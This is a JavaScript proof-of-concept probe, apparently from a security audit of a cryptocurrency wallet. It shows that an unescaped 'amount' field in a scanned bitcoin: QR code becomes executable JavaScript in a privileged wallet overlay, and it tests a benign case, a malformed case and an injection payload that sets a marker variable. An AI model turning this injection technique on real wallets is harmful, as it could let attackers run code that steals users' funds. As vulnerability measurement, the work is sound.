// P0.6 — REAL-BINARY measurement of the amount-injection link (Link B).
// Runs INSIDE the real wallet-panel overlay V8 (subject proved via location.href).
//
// What this measures: simple_render_process_handler.cpp:920 builds
//     js = "window.dispatchEvent(new MessageEvent('message',{data:{...data:" + json + "}}));"
// and calls frame->ExecuteJavaScript(js) targeted at the wallet overlay's main
// frame. `json` is ClassifyAndBuildJson's output, whose BIP21 branch appends
//     json += ",\"amount\":" + amount;   // RAW, UNQUOTED, UNESCAPED
// (QRScreenCapture.cpp). So an attacker-chosen `amount` in a scanned QR becomes
// executable JS in the privileged overlay. This probe reproduces ClassifyAndBuildJson
// VERBATIM in-page, wraps it in the exact line-920 template, and eval()s it in the
// real overlay V8 — the same V8 ExecuteJavaScript feeds. It does NOT model the C++;
// the C++ raw-concat is cited from source. It measures whether THIS V8 runs it.
(function () {
  var BS = String.fromCharCode(92);
  function JsonEscape(s) {
    var out = '';
    for (var i = 0; i < s.length; i++) {
      var c = s[i];
      if (c === '"') out += BS + '"';
      else if (c === BS) out += BS + BS;
      else if (c === '\n') out += BS + 'n';
      else if (c === '\r') out += BS + 'r';
      else if (c === '\t') out += BS + 't';
      else out += c;
    }
    return out;
  }
  function UrlDecode(s) {
    var result = '';
    for (var i = 0; i < s.length; i++) {
      if (s[i] === '%' && i + 2 < s.length) {
        var hex = s.substr(i + 1, 2);
        if (/^[0-9a-fA-F]{2}$/.test(hex)) { result += String.fromCharCode(parseInt(hex, 16)); i += 2; continue; }
      }
      if (s[i] === '+') { result += ' '; continue; }
      result += s[i];
    }
    return result;
  }
  // ClassifyAndBuildJson BIP21 branch, verbatim from QRScreenCapture.cpp
  function ClassifyAndBuildJson(text) {
    if (!/^bitcoin:/i.test(text)) return '';
    var address = '', amount = '', label = '';
    var colon = text.indexOf(':');
    var rest = colon !== -1 ? text.substring(colon + 1) : text;
    var q = rest.indexOf('?');
    address = q !== -1 ? rest.substring(0, q) : rest;
    if (q !== -1) {
      rest.substring(q + 1).split('&').forEach(function (pair) {
        var eq = pair.indexOf('=');
        if (eq === -1) return;
        var key = pair.substring(0, eq);
        var val = UrlDecode(pair.substring(eq + 1));
        if (key === 'amount') amount = val;
        else if (key === 'label') label = val;
      });
    }
    var json = '{"type":"bip21","value":"' + JsonEscape(text) + '"';
    if (address) json += ',"address":"' + JsonEscape(address) + '"';
    if (amount) json += ',"amount":' + amount;
    if (label) json += ',"label":"' + JsonEscape(label) + '"';
    json += ',"source":"screen"}';
    return json;
  }
  function line920(payload) {
    var resultJson = ClassifyAndBuildJson(payload);
    var delivered = '{"status":"found","result":' + resultJson + '}';
    return "window.dispatchEvent(new MessageEvent('message',{data:{type:'qr_screen_capture_result',data:" + delivered + "}}));";
  }

  var out = { href: location.href, cases: [] };

  // CASE 1 — benign control: a well-formed numeric amount must NOT set the probe.
  var benign = 'bitcoin:16cezrim1PR2DGuFivZr8kWUSan1LD6XFZ?amount=0.11828417&label=PaiyBit%20media';
  delete window.__hodos_qr_probe;
  var c1 = { name: 'benign_numeric', payload: benign, js: line920(benign) };
  try { (0, eval)(c1.js); c1.ran = true; } catch (e) { c1.ran = false; c1.threw = e.constructor.name + ': ' + e.message; }
  c1.probe_after = window.__hodos_qr_probe === undefined ? '(unset)' : String(window.__hodos_qr_probe);
  out.cases.push(c1);

  // CASE 2 — mild bug: non-numeric amount yields invalid JS -> silent delivery failure.
  var badnum = 'bitcoin:16cezrim1PR2DGuFivZr8kWUSan1LD6XFZ?amount=abc';
  var c2 = { name: 'nonnumeric_amount', payload: badnum, js: line920(badnum) };
  try { (0, eval)(c2.js); c2.ran = true; } catch (e) { c2.ran = false; c2.threw = e.constructor.name + ': ' + e.message; }
  out.cases.push(c2);

  // CASE 3 — INJECTION: attacker amount executes in THIS (wallet overlay) V8.
  // Payload uses no '&' (param sep) and no '%' (urldecode), so it survives verbatim.
  var inj = "bitcoin:16cezrim1PR2DGuFivZr8kWUSan1LD6XFZ?amount=(window.__hodos_qr_probe=typeof fetch,0)";
  delete window.__hodos_qr_probe;
  var c3 = { name: 'injection', payload: inj, js: line920(inj) };
  try { (0, eval)(c3.js); c3.ran = true; } catch (e) { c3.ran = false; c3.threw = e.constructor.name + ': ' + e.message; }
  c3.probe_after = window.__hodos_qr_probe === undefined ? '(unset)' : String(window.__hodos_qr_probe);
  c3.INJECTION_EXECUTED = (window.__hodos_qr_probe === 'function'); // typeof fetch === 'function' in the privileged overlay
  out.cases.push(c3);

  delete window.__hodos_qr_probe;
  return JSON.stringify(out, null, 1);
})()
